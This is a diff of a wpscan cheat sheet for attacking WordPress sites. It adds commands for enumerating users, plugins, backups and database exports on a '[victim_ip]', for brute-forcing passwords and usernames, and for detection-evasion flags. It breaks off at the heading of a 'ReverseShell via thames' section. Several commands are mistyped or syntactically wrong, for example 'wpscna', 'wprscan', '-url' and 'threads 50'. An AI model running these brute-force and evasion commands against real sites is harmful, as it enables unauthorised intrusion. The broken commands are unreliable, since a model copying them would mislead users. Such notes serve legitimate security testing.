@@ -1,5 +1,8 @@
 ### wpscan 
 
+#### update wpscan 
+- wpscna update
+
 #### Scan
 - wpscan --url https://[target_ip]
 #### Vulnerable Plugins
@@ -7,10 +10,34 @@
 #### Vulnerable Themes
 - wpscan --url http://[victim_ip] --enumerate vt
 #### Enumerate Users
-- wpscan -u http://[victim_ip] --enumerate u
+- wpscan -url http://[victim_ip] --enumerate u
 #### Password Bruteforce
-- wpscan -u http://[victim_ip] --wordlist file.txt threads 50
-------------------------------------------------------------------------------------------------------------------------------------------
+- wpscan -url http://[victim_ip] -P wordlist.txt threads 50
+#### Username Bruteforce
+- wprscan -url http://[victim_ip] -U wordlist.txt 
+#### All Plugins
+- wpscan --url http://[victim_ip] --enumerate p
+#### All Themes
+- wpscan --url http://[victim_ip] --enumerate vt
+#### Database Exports
+- wpscan --url http://[victim_ip] --enumerate dbe
+#### Backups
+- wpscan --url http://[victim_ip] --enumerate cb
+##### Random User-Agent
+- --random-user-agent
+##### Avoid Detection(limited check)
+- --stealthy
+##### Disable SSL/TLS Security
+- --disable-tls-checks
+##### Disable Wordpress Detection
+- --force
+###### Docker pull the repo
+- docker pull wpscanteam/wpscan
+###### Docker Enumerate Usernames
+- docker run -it --rm wpscanteam/wpscan --url
+[victim_ip] --enumerate u
+
+----------------------------------------------------------------------------------------------------------------------------------------
 ### ReverseShell via thames
 
 - Log_in
